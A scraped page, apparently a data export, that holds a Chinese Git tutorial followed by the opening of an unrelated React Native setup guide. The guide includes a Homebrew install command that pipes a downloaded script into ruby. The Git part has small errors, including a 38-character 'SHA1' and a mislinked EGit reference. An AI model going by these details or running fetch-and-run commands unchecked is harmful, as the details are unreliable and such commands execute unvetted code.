<p>从 Git 源码安装至少可以保证版本是最新的。在安装 Git 之前，需要安装其依赖的软件包，包括 curl、zlib、openssl、expat、libiconv 等。根据不同类型的 Linux，读者可以选择不同的软件包安装工具，这里以 yum 为例，其安装命令如下：</p>
<pre><code>$ yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel</code></pre>
<p>接下来，读者可以从 Git 官方站点 <a href=""http://git-scm.com/download"" rel=""nofollow noreferrer"">http://git-scm.com/download</a> 下载最新 Git 源代码（由于时间的差异，笔者无法保证本文所述 Git 为最新版本），执行以下命令编译安装。</p>
<pre><code>$ tar -zxf git-1.7.6.tar.gz
$ cd git-1.7.6
$ make prefix=/usr/local all
$ sudo make prefix=/usr/local install</code></pre>
<p>最后，敲入 git 命令，检验安装是否成功，如图 5 所示。可以看到，我们已经成功安装 Git 了。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6yq"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image005.png"" title=""image005.png""></span><br><em>图 5. 通过源码安装 Git</em></p>
<h3><strong>2. 在 Linux 上安装</strong></h3>
<p>要在 Linux 上安装预编译好的 Git 二进制安装包，可选择系统支持的软件包管理器。对于红帽 Linux，使用 yum 命令安装：</p>
<pre><code>$ yum install git-core</code></pre>
<p>而对于 Ubuntu 这类 Debian 体系的 Linux 系统，使用 apt-get 命令安装：</p>
<pre><code>$ apt-get install git-core</code></pre>
<p>由于此种安装方式非常简单，这里不做贴图展示了。</p>
<h3><strong>3. 在 Mac 上安装</strong></h3>
<p>Mac 系统支持 Git 安装的方式分为两种：编译安装与图形安装。其命令行式的编译安装与 Linux 大同小异，这里不再介绍。相比之下，Mac 图形安装 Git 更加简单，其安装截图如图 6 所示。读者可去 <a href=""http://code.google.com/p/git-osx-installer"" rel=""nofollow noreferrer"">http://code.google.com/p/git-osx-installer</a> 下载最新支持 Mac 系统的 Git 版本。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6yx"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image006.png"" title=""image006.png""></span><br><em>图 6. 从 Mac 上安装 Git</em></p>
<h3><strong>4. 在 Windows 上安装</strong></h3>
<p>与之前所述的 Mac 安装 Git 一样，在 Windows 上安装 Git 也同样轻松。根据用户的使用习惯，我们又可以大致分为三类：</p>
<p><strong>习惯命令行的用户，可选择 msysGit 安装包。</strong>安装截图如 7 所示。msysGit 的官方下载地址为：<a href=""http://code.google.com/p/msysgit"" rel=""nofollow noreferrer"">http://code.google.com/p/msysgit</a>。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6yH"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image007.png"" title=""image007.png""></span><br><em>图 7. 从 Windows 上安装命令行 Git 工具——msysGit</em></p>
<p><strong>对于习惯 Tortoise 风格的用户，可以选择 TortoiseGit 安装包。</strong>安装后的右键截图如图 8 所示。TortoiseGit 的下载地址为：<a href=""http://code.google.com/p/tortoisegit/"" rel=""nofollow noreferrer"">http://code.google.com/p/tortoisegit/</a>。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6yN"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image008.png"" title=""image008.png""></span><br><em>图 8. 从 Windows 上安装“右键”Git 工具——TortoiseGit</em></p>
<p><strong>而对于习惯 Eclipse 风格的用户，可以选择 Eclipse 插件——EGit 方式安装。</strong>其 Git Repositories 视图截图如图 9 所示。EGit 的下载地址为：<a href=""http://download.eclipse.org/egit/updates"" rel=""nofollow noreferrer"">http://download.eclipse.org/egit/updates</a>。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6yU"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image009.png"" title=""image009.png""></span><br><em>图 9. 从 Windows 上安装 Eclipse 的 Git 插件——EGit</em></p>
<p>无论是哪一种安装方式，如果是第一次使用 Git，均需要配置用户信息，包括用户名与 Email（如下所示），以便以后每次 Git 提交时都可以自动引用这两条信息，说明是谁更新与提交了代码。</p>
<pre><code>$ git config --global user.name ""Pi Guang Ming""
$ git config --global user.email piguangming@gmail.com</code></pre>
<p>到此为止，我们已经介绍了 Git 的分布式模型、快照模型、针对不同操作系统平台的 Git 安装之后，接下来是本文的主题内容，即 Git 的使用。</p>
<h2><strong>如何使用 Git</strong></h2>
<p>前面提到，这一部分是本文的重点。我们将主要精力集中在 Git 底层的工作原理、以及实际工程中较为实用的 Git 分支、标签、补丁、CVS 与 SVN 针对 Git 的迁移等，关于 Git 的各种基础命令语法、解释说明，以及本文没有涉及到的内容，均可参见 Git 相关使用指南。</p>
<h3><strong>创建 Git 项目仓库</strong></h3>
<p>在正式使用 Git 之前，我们至少需要创建一个 Git 代码仓库（简称 Git 仓库）。通常而言，取得一个 Git 仓库的方法有两种。第一种是在现存的目录下，通过导入所有文件来创建新的 Git 仓库；第二种是从远程 Git 镜像仓库直接克隆到本地仓库。</p>
<p>针对第一类 Git 仓库，我们可以使用 git init 命令创建一个崭新的 Git 项目仓库，如下：</p>
<pre><code>$ git init</code></pre>
<p>初始化 Git 后，在当前目录下会出现一个名为 .git 的隐藏目录，如图 10 所示。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6zi"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image010.png"" title=""image010.png""></span><br><em>图 10. <code>.git</code> 目录</em></p>
<p>之所以特意强调 .git 目录，是因为它十分重要。对于一个 Git 仓库来说，其 .git 目录保存了整个 Git 项目的所有数据与资源。关于 .git 目录中各种文件的简要解释说明，如表 1 所示。如果需要了解详细信息，请参见 Git 官方网站：<a href=""http://git-scm.com/"" rel=""nofollow noreferrer"">http://git-scm.com/</a>‎。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6zN"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span><br><em>表 1 .git 目录简要说明</em></p>
<p>针对第二类 Git 仓库，我们不需要 git init 初始化仓库，取而代之的是，使用 git clone 直接将远程镜像克隆到本地仓库。这里，我们以下载 Git 软件本身的源代码为例，其 git clone 命令如下：</p>
<pre><code>git clone git://git.kernel.org/pub/scm/git/git.git</code></pre>
<p>通过 ls git 命令，我们可以查看 Git 仓库中的内容，如图 11 所示。需要说明的是，针对远程仓库的镜像，实际拷贝的就是 .git 目录下的数据，然后根据元数据恢复成原来的整个项目结构，也即是图 11 所示的内容。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6zP"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image011.png"" title=""image011.png""></span><br><em>图 11. 克隆 Git 源代码</em></p>
<p>此外，除了 git:// 协议，针对不同的使用场景，git clone 还支持 ssh://、http(s):// 等各种不同协议。</p>
<h3><strong>Git 对象模型</strong></h3>
<p>应该说，Git 对象模型是整个 Git 设计思想中最核心的部分。理解 Git 对象模型是理解整个 Git 的关键。简单来说，每个 Git 对象包含三部分：类型，大小和内容。其中，对象的类型又分为 commits, trees, blobs, tags，其简要说明如下：</p>
<ul>
<li><p>blob 对象：一块二进制数据，用来存储文件数据，通常是一个文件。</p></li>
<li><p>tree 对象：指向 blob 对象或是其它 tree 对象的指针，一般用来表示内容之间的目录层次关系。</p></li>
<li><p>commit 对象：一个 commit 对象只指向一个 tree 对象，用来标记项目某一个特定时间点的状态，如时间戳、父对象、作者、提交者等。</p></li>
<li><p>tag 对象：与 CVS、SVN 标签的概念类似。</p></li>
</ul>
<p>接下来，我们结合一个示例来解释不同 Git 对象之间的关系。图 12 展示的是一个样例 Ruby 项目，可以看出，这个例子非常简单，仅作示意。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6z2"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image012.png"" title=""image012.png""></span><br><em>图 12. Ruby 项目的目录层次结构</em></p>
<p>如果我们把该项目提交到 Git 仓库中，那么它的 Git 对象关系就如图 13 所示。其中，3 个 blob 对象分别对应 README、mylib.rb、yourlib.rb 三个文件的内容快照。而 3 个 tree 对象指针则完整描述了项目的整个目录结构，包括目录树内容、文件与 blob 对象的对应关系，各个文件对应 blob 对象索引等信息。而每一次提交都会生成一个 commit 对象指针，指向 tree 对象树的根节点，不仅如此，commit 对象还包含作者、提交人等详细信息。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6Aa"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image013.png"" title=""image013.png""></span><br><em>图 13. Ruby 项目的 Git 对象关系图</em></p>
<p>不难看出，众多 tree 对象与 blob 一起，作为内容节点（目录或文件），构成了一个有向无环图。在任何时候，通过与 commit 对象关联的根节点，就可以遍历出整个项目在本次提交时的所有内容。而前面提到，Git 分支本质上是指向 commit 对象的指针。两个 Git 分支的合并，实质上是等价于两个有向无环图的合并，而有向无环图可以让 Git 更加高效判断分支共同的父节点。因此，Git 对象模型设计赋予了开发人员最大的灵活性来任意创建分支，并在自己的分支上进行开发。</p>
<p>尽管以上几种对象的类型不同，每一种对象都拥有同一长度的唯一标识，以 40 位字符串表示。实际上，图 13 的对象标识均为简写，其中，commit 对象完整的标识如下：</p>
<pre><code>98ca9e0acb0be0321191a59e1d34ba5c867fa3</code></pre>
<p>为保证对象标识的唯一性，Git 采用了 SHA1 哈希算法。这样做，起码有三大好处：</p>
<ul>
<li><p>Git 只要比较对象名，就可以很快的判断两个对象是否相同。</p></li>
<li><p>由于每个仓库中""对象名""的计算方法都完全一样，因此，如果同样的内容存在两个不同的仓库中，就会存在相同的""对象名""下。</p></li>
<li><p>Git 还可以通过检查对象内容的 SHA1 哈希值与""对象名""是否相同，来判断对象内容是否正确。</p></li>
</ul>
<p>总结一下 Git 对象模型，blob 对象即项目中的所有实体文件，包括源代码、图片资源、xml 配置信息等内容。特别需要强调的是，blob 对象记录的仅仅是文件内容，而关于文件所在目录、名字大小等信息，则统统记录在关联它的 tree 对象上。我们每次提交文件，都会产生一个 commit 对象，并更新改动文件所关联的 tree 对象。</p>
<h3><strong>Git 三种状态</strong></h3>
<p>在理解 Git 对象模型之后，我们的焦点转向 Git 文件的检入与检出。Git 仓库模型大致分为三个工作区域，分别为工作目录（Working Directory），暂存区域（Stage 或 Index），以及本地仓库（History），相应的检入与检出命令如图 14 所示：</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6Ae"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image014.png"" title=""image014.png""></span><br><em>图 14. Git 三种状态之间的转换（1）</em></p>
<p>相关命令的简要说明如下：</p>
<ul>
<li><p>git add files：把当前工作文件拷贝到暂存区域。</p></li>
<li><p>git commit：在暂存区域生成文件快照并提交到本地仓库。</p></li>
<li><p>git reset -- files：用来撤销最后一次 git add files，也可以用 git reset 撤销所有暂存区域文件。</p></li>
<li><p>git checkout -- files：把文件从暂存区域覆盖到工作目录，用来丢弃本地修改。</p></li>
</ul>
<p>作为示例，图 15 演示了如何通过 git add 与 git checkout 分别在工作目录与暂存区之间来回复制，读者可以自行尝试 git commit 与 git reset 命令。首先，我们在工作目录创建一个内容为""hello git""的 test 文件，通过 git add 命令将 test 文件复制到暂存区。然后，在工作目录修改 test 文件，添加一行""hello git branch""。此时，暂存区的内容依然为""hello git""，没有改变。最后，通过 git checkout 将暂存区的 test 文件覆盖工作目录，即放弃了本地修改，最终文件内容为""hello git""。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6Ay"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image015.png"" title=""image015.png""></span><br><em>图 15. git checkout -- files 示例</em></p>
<p>实际上，工作目录与仓库之间的复制也可以一步到位，如图 16 所示。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6AF"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image016.png"" title=""image016.png""></span><br><em>图 16. Git 三种状态之间的转换（2）</em></p>
<p>其中，git commit -a 等价于 git add 与 git commit，即先把文件从工作目录复制到暂存区，然后再从暂存区复制到仓库中。git checkout HEAD -- files 的过程刚好相反，即回滚到最后一次提交。<br>为了查看工作目录，暂存区域，以及本地仓库的文件有哪些不同，可以使用 git diff 命令，如图 17 所示：</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6A2"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image017.png"" title=""image017.png""></span><br><em>图 17. Git 三种状态之间的比较</em></p>
<p>git diff 命令相关的简要说明如下：</p>
<ul>
<li><p>git diff：查看尚未暂存的文件更新了哪些部分。</p></li>
<li><p>git diff --cached：查看已暂存文件和上次提交时的快照之间的差异。</p></li>
<li><p>git diff HEAD：查看未暂存文件与最新提交文件快照的区别。</p></li>
<li><p>git diff &lt;index1&gt; &lt;index2&gt;：查看不同快照之间的区别。</p></li>
</ul>
<p>作为示例，图 18 演示了 git diff 的用法。可以看到，通过 git diff 比较，知道工作目录比暂存区多了一行""hello git tag""；而通过 git diff HEAD 比较，知道工作目录又比仓库最新提交文件多了两行，分别是""hello git branch""与""hello git tag""。由此推断，暂存区比仓库多了一行""hello git branch""，而这恰好与 git diff –cached 的结论相吻合。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6Ba"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image018.png"" title=""image018.png""></span><br><em>图 18. Git 三种状态之间的比较——示例</em></p>
<p>以上是关于 Git 检入与检出操作的基础用法，关于更详细命令以及语法说明，可参见相关 Git 学习指南。<br>接下来，我们介绍 Git 更加高级的功能与特性。</p>
<h3><strong>Git 分支模型</strong></h3>
<p>前面提到，Git 中的分支本质上是一个指向 commit 对象的可变指针。Git 会维护一个默认分支——master。每一次提交之后，master 指针都会自动向前移动。而如果要创建一个新的分支，可以使用 git branch 命令：</p>
<pre><code>$ git branch bugFix</code></pre>
<p>这会在当前 commit 对象上新建一个分支指针，如图 19 所示。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6Bq"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image019.png"" title=""image019.png""></span><br><em>图 19. 新建分支 bugFix</em></p>
<p>那么，Git 是如何知道当前在哪个分支上工作的呢？其实答案也很简单，它保存着一个名为 HEAD 的特别指针，它是一个指向当前工作分支的指针。我们可以将 HEAD 想象为当前分支的别名。在这一点上，它和 CVS、SVN 的 HEAD 概念大不相同。</p>
<p>运行 git branch 命令，仅仅是建立了一个新的分支，但不会自动切换到这个分支中去，所以在这个例子中，我们依然还在 master 分支里工作。要切换到其他分支，可以执行 git checkout 命令。</p>
<pre><code>$ git checkout bugFix</code></pre>
<p>这样 HEAD 就指向了 bugFix 分支，见图 20 所示。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6BB"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image020.png"" title=""image020.png""></span><br><em>图 20. 切换到 bugFix 分支</em></p>
<p>实际上，我们可以将分支的创建与切换两步合二为一。要新建并切换到该分支，运行 git checkout 并加上 -b 参数：</p>
<pre><code>$ git checkout -b bugFix</code></pre>
<p>接下来，再提交一次：</p>
<pre><code>$ vi test.rb
$ git commit -a -m 'update copyright'</code></pre>
<p>图 21 展示了提交后的结果。非常有趣，现在 bugFix 分支向前移动了一格，而 master 分支仍然指向原先 git checkout 时所在的 commit 对象。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6BH"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image021.png"" title=""image021.png""></span><br><em>图 21. 在 bugFix 分支提交文件</em></p>
<p>我们再切换到 master 分支：</p>
<pre><code>$ git checkout master</code></pre>
<p>其结构如图 22 所示。这条命令做了两件事。第一，它把 HEAD 指针移回到 master 分支；第二，把工作目录中的文件替换成了 master 分支所指向的快照内容。也就是说，从现在开始，基于该文件的一系列提交都将始于一个较老的版本。它的主要作用在于，可以将 bugFix 分支里作出的修改暂时取消，隔离 bugFix 分支对 master 分支的影响。在实际项目中，我们经常有这样的需求，即采用 developer 分支开发主要版本，bugFix 分支负责修复 bug，彼此互相隔离，最后合并。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6B4"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image022.png"" title=""image022.png""></span><br><em>图 22. 切换成 master 分支</em></p>
<p>我们作些修改后再次提交：</p>
<pre><code>$ vi test.rb
$ git commit -a -m 'made other changes'</code></pre>
<p>现在我们的项目提交历史产生了分叉，如图 23 所示，原因是刚才我们创建了一个分支，进行了一些工作，然后又切换到主分支进行了另一些工作。我们可以在不同分支里反复切换，并在时机成熟时将它们合并到一起。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6Ce"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image023.png"" title=""image023.png""></span><br><em>图 23. 在 master 分支提交文件</em></p>
<p>git merge 命令把不同分支合并起来。合并前，HEAD 必须指向当前最新的提交。按使用场景不同，git merge 操作又分为三种情况：</p>
<ul>
<li><p>如果另一个分支是当前提交的祖父节点，那么 git merge 命令将什么也不做。</p></li>
<li><p>反过来，如果当前提交是另一个分支的祖父节点，就导致 fast-forward 合并。指向只是简单的移动，并生成一个新的提交。</p></li>
<li><p>否则就是一次真正的合并。默认把当前提交 (ed489 如下所示 ) 和另一个提交 (33104) 以及他们的共同祖父节点 (b325c) 进行一次三方合并。结果是先保存当前目录和索引，然后和父节点 33104 一起做一次新提交，如图 24 所示。</p></li>
</ul>
<p><span class=""img-wrap""><img data-src=""/img/bVs6Cj"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image024.png"" title=""image024.png""></span><br><em>图 24. 合并分支</em></p>
<p>可以看到，git merge 命令把两个父分支合并进行一次提交，但提交历史不是线性的。相比之下，分支衍合命令 git rebase 在当前分支上重演另一个分支的历史，从而保证提交历史是线性的，如图 25 所示。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6Cl"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image025.png"" title=""image025.png""></span><br><em>图 25. 衍合分支</em></p>
<p>作为示例，我们演示关于 git merge 与 git rebase 的区别，见图 26 所示。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6Cp"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image026.png"" title=""image026.png""></span><br><em>图 26. 合并分支 vs 衍合分支</em></p>
<p>有时候合并操作并不会如此顺利，如果在不同的分支中都修改了同一个文件的同一部分，会造成合并冲突，Git 就无法干净地把两者合到一起。此时，Git 仅作合并，但不提交，它会停下来等人为地解决冲突，如下：</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6Fp"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>以上，我们介绍了 Git 分支的创建，切换，合并（线性与非线性），冲突，以及删除。</p>
<h3><strong>Git 标签</strong></h3>
<p>与 CVS、SVN 等其它版本控制系统一样，Git 也支持打 Git 标签 。在程序开发到一个阶段后，我们需要打个标签，发布一个版本，如 0.1.2，v0.1.2 等。</p>
<p>Git 使用的标签有两种类型：轻量级的（lightweight）和含附注的（annotated）。轻量级标签实际上就是个指向特定提交对象的引用；而含附注标签实际上是存储在仓库中的一个独立 Git 对象。相比之下，含附注标签包含信息更多，包括自身校验信息，标签名字，Email，标签日期，以及标签说明等。含附注标签本身也允许使用 GNU Privacy Guard (GPG) 来签署或验证，因此我们推荐使用含附注的标签，以便保留相关信息。</p>
<p>要打上标签，可执行以下 Git 命令：</p>
<pre><code>$ git tag -a v0.1.2 -m ""Release version 0.1.2""</code></pre>
<p>相应地，要查看标签，执行下列 Git 命令：</p>
<pre><code>$ git tag –l</code></pre>
<p>当然，也可采用 git show 命令查看标签版本与提交对象等详细信息。</p>
<pre><code>$ git show v0.1.2</code></pre>
<p>删除标签的 Git 命令如下：</p>
<pre><code>git tag -d v0.1.2</code></pre>
<p>如果我们有自己的私钥，还可以用 GPG 来签署标签，只需要把之前的 -a 改为 -s，如下</p>
<pre><code>$ git tag -s v0.1.2 -m ""My signed 0.1.2 tag""</code></pre>
<p>要验证已经签署的标签，可以先取到对应的公钥，然后使用 git tag –v 命令验证，如下：</p>
<pre><code>$ git tag -v v0.1.2</code></pre>
<p>需要注意的，默认情况下，git push 并不会把标签传送到远端仓库上。我们只能通过显式命令才能分享标签。其命令格式如下：</p>
<pre><code>$ git push origin v0.1.2</code></pre>
<p>如果希望一次性推送所有本地新增的标签，可以使用 --tags 选项：</p>
<pre><code>$ git push origin --tags</code></pre>
<p>如此一来，其他人克隆共享仓库或拉取数据同步后，也会看到这些标签。</p>
<h3><strong>Git 补丁</strong></h3>
<p>UNIX 世界中，补丁（Patch）的概念非常重要，几乎所有大型 UNIX 项目的普通贡献者，都是通过补丁来提交代码。对于 Linux 内核项目而言，普通开发者先从 Git 项目仓库克隆下代码，然后写入代码，做一个补丁，最后用 E-mail 发给 Linux 内核的维护者就可以了。</p>
<p>Git 提供了两种简单的补丁生成方案。一是使用 git diff 生成的标准补丁，二是使用 git format-patch 生成的 Git 专用补丁。这里，我们重点介绍第二种方式，关于第一种 git diff 方式，比较简单，这里不做介绍。<br>假设我们有一个项目 myproj，其工作目录里最初有一个文件 test，内容是""hello git""，默认提交给 master 分支。这里，我们创建一个新分支 bugFix 用于代码修改，如图 27 所示：</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6Cz"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image027.png"" title=""image027.png""></span><br><em>图 27. 创建分支</em></p>
<p>接下来，我们在 test 文件里面追加一行""fix""，并使用 git format-patch 生成一个 patch，如图 28 所示，其中，git format-patch 的 -M 选项表示这个 patch 要和哪个分支比对。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6CC"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image028.png"" title=""image028.png""></span><br><em>图 28. 生成补丁</em></p>
<p>可以看到，补丁文件 0001-fix.patch 包含各种信息，不仅有 diff 的信息，还有提交者，时间等等。仔细一看你会发现，这是个 E-mail 的文件，可以直接发送。</p>
<p>接下来，可以使用 git am 来应用补丁，如图 29 所示。可以看到，相比于原来的 test 文件，打上补丁后，多了一行""fix""。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6CO"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image029.png"" title=""image029.png""></span><br><em>图 29. 应用补丁</em></p>
<p>关于以上两种生成补丁方式的比较，很明显，相比于 git diff 生成的通用补丁，git format-patch 生成的 Git 专用补丁兼容性较弱。不过，Git 专用补丁中含有补丁开发者的名字，在应用补丁时，这个名字会被记录进版本库。因此，目前使用 Git 的开源社区往往建议大家使用 format-patch 生成补丁。</p>
<h3><strong>Git 远程仓库操作</strong></h3>
<p>前面提到，Git 是分布式版本控制系统。对于一个分布式节点来说，其它节点的 Git 仓库都可以作为本地仓库的远程仓库。要查看当前配置有哪些远程仓库，可以使用以下命令：</p>
<pre><code>$ git remote</code></pre>
<p>在克隆完某个项目后，至少可以看到一个名为 origin 的远程库，Git 默认使用这个名字来标识你所克隆的原始仓库。</p>
<p>项目进行到一个阶段，要同别人分享目前的成果，可以使用 git push 命令将本地仓库中的数据推送到远程仓库。</p>
<pre><code>$ git push origin master</code></pre>
<p>而要将远程仓库抓取数据到本地，可以使用 git fetch 命令，从而获取所有本地仓库中还没有的数据。</p>
<pre><code>$ git fetch [remote-name]</code></pre>
<p>如果设置了某个分支用于跟踪某个远端仓库的分支，可以使用 git pull 命令自动抓取数据下来，然后将远端分支自动合并到本地仓库中当前分支。从这个角度，git pull 等价于 git fetch + git merge 的功能。</p>
<pre><code>$ git pull [remote-name]</code></pre>
<p>关于以上几种 Git 远程仓库的相关操作，其关系见图 30 所示。要了解 Git 远程仓库的更多命令，如删除与重命名等，可参阅相关 Git 操作指南。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6CS"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image030.png"" title=""image030.png""></span><br><em>图 30. Git 远程仓库的操作</em></p>
<h3><strong>CVS 迁移到 Git</strong></h3>
<p>对于想要从 CVS 迁移到 Git 的用户，可以使用 git cvsimport 工具解决迁移问题，前提是安装相关工具 git-cvs 或 cvsps。</p>
<p>关于 git-cvs 工具，可以使用 yum 或者 apt-get 命令安装。以 yum 为例，其安装命令如下：</p>
<pre><code>$ yum install git-cvs</code></pre>
<p>如果是源码编译安装 Git，则需要安装 cvsps，下载地址：<a href=""http://www.cobite.com/cvsps/"" rel=""nofollow noreferrer"">http://www.cobite.com/cvsps/</a></p>
<pre><code>$ tar -zxvf cvsps-2.1.tar.gz
$ cd cvsps-2.1
$ make &amp;&amp; make install</code></pre>
<p>作为示例，我们新建一个目录 jt400.cvs，并将文章开头提到的 SourceForge 托管的 CVS 项目 Toolbox for Java/JTOpen 的源码导入到 Git 中来，操作过程如下：</p>
<pre><code>$ mkdir jt400.cvs
$ cd jt400.cvs
$ export CVSROOT=:pserver:piguangming@jt400.cvs.sourceforge.net:/cvsroot/jt400
$ cvs login
$ git cvsimport -C src src</code></pre>
<p>其中，-C src 是要往 git 仓库里创建的项目名称，最后那个 src 是 cvs 中要导入的模块。</p>
<h3><strong>SVN 迁移到 Git</strong></h3>
<p>同样，Git 也提供了 git svn 相关工具，提供 SVN 项目到 Git 的迁移，前提是安装相关工具 subversion-perl。</p>
<pre><code>$ yum install install subversion-perl</code></pre>
<p>作为示例，我们新建一个目录 photon-android.svn，并将 googlecode 托管的 SVN 项目 photon-android 导入到 Git 中来，操作过程如下：</p>
<pre><code>$ mkdir photon-android.svn
$ cd photon-android.svn
$ git svn clone http://photon-android.googlecode.com/svn/</code></pre>
<h2><strong>总结</strong></h2>
<p>本文系统性地介绍了分布式版本控制工具——Git，包括为什么使用 Git，Git 的安装，Git 的工作原理，Git 的使用方法，CVS 与 SVN 向 Git 迁移等。有关 Git 更全面的使用方法，请参见文档：<a href=""https://github.com/progit/progit"" rel=""nofollow noreferrer"">https://github.com/progit/progit</a>。</p>
<h2><strong>参考资料</strong></h2>
<ul>
<li><p>访问 profit:<a href=""https://github.com/progit/progit"" rel=""nofollow noreferrer"">https://github.com/progit/progit</a>。</p></li>
<li><p>访问 git-scm.com:<a href=""http://git-scm.com/"" rel=""nofollow noreferrer"">http://git-scm.com/</a> 及其下载:<a href=""http://git-scm.com/download"" rel=""nofollow noreferrer"">http://git-scm.com/download</a>。</p></li>
<li><p>访问 Git for OS X:<a href=""http://code.google.com/p/git-osx-installer"" rel=""nofollow noreferrer"">http://code.google.com/p/git-osx-installer</a>。</p></li>
<li><p>访问 msyspit:<a href=""http://code.google.com/p/msysgit"" rel=""nofollow noreferrer"">http://code.google.com/p/msysgit</a>。</p></li>
<li><p>访问 tortoisegit:<a href=""http://code.google.com/p/tortoisegit"" rel=""nofollow noreferrer"">http://code.google.com/p/tortoisegit</a>。</p></li>
<li><p>访问 eclipse.org/egit/updates:<a href=""http://code.google.com/p/tortoisegit"" rel=""nofollow noreferrer"">http://code.google.com/p/tortoisegit</a>。</p></li>
<li><p>访问 CVSps:<a href=""http://www.cobite.com/cvsps/"" rel=""nofollow noreferrer"">http://www.cobite.com/cvsps/</a>。</p></li>
<li><p>访问 photon-android:<a href=""http://photon-android.googlecode.com/svn/"" rel=""nofollow noreferrer"">http://photon-android.googlecode.com/svn/</a>。</p></li>
<li><p>访问 Toolbox for Java/JTOpen:<a href=""https://sourceforge.net/projects/jt400"" rel=""nofollow noreferrer"">https://sourceforge.net/projects/jt400</a></p></li>
</ul>
<p><strong>分享来源：</strong>developerWorks 中国&gt;技术主题&gt;Open source&gt;文档库<br><a href=""http://www.ibm.com/developerworks/cn/opensource/os-cn-tourofgit/"" rel=""nofollow noreferrer"">http://www.ibm.com/developerworks/cn/opensource/os-cn-tourofgit/</a></p>

                ", [分享] 开源分布式版本控制工具 —— Git 之旅,1531972054,445,1,126,1,1,https://segmentfault.com/a/1190000004514697
117,1,0,6,"
                    
<pre><code>Any application that than can be written in JavaScript will eventually be written in JavaScript -Jeff Atwood</code></pre>
<p>React Native是Facebook开源的，在Javascript和React的基础上构建原生的Android和IOS应用的平台。<br>React Native着力于提高多平台的开发效率，<code>Learn once,write anywhere</code>。</p>
<p>下面简单介绍下React Native的环境搭建。</p>
<h2>环境要求</h2>
<p>最新的OS X系统 ，要开发IOS 应用就必须使用Mac OS系统。<br>Homebrew：安装教程 <a href=""http://brew.sh/"" rel=""nofollow noreferrer"">http://brew.sh/</a> ，Mac上的包管理软件<br>Node.js : <a href=""https://nodejs.org/en/"" rel=""nofollow noreferrer"">https://nodejs.org/en/</a> <br>watchman:<a href=""https://facebook.github.io/watchman/docs/install.html"" rel=""nofollow noreferrer"">https://facebook.github.io/watchman/docs/install.html</a> <br>facebook的开源的一个文件监视系统。<br>flow:<a href=""http://flowtype.org/"" rel=""nofollow noreferrer"">http://flowtype.org/</a> facebook开源的一个JavaScript静态检查工具</p>
<h2>安装</h2>
<p>安装Homebrew:</p>
<blockquote><p>/usr/bin/ruby -e ""$(curl -fsSL<a href=""https://raw.githubusercontent.com/Homebrew/install/master/install"" rel=""nofollow noreferrer"">https://raw.githubusercontent.com/Homebrew/install/master/install</a>)""</p></blockquote>
<p>使用Homebrew安装node.js：</p>
<blockquote><p>brew install node</p></blockquote>
<p>安装watchman：</p>
<blockquote><p>brew install watchman</p></blockquote>
<p>安装flow ：</p>
<blockquote><p>brew install flow</p></blockquote>
<h2>更新</h2>
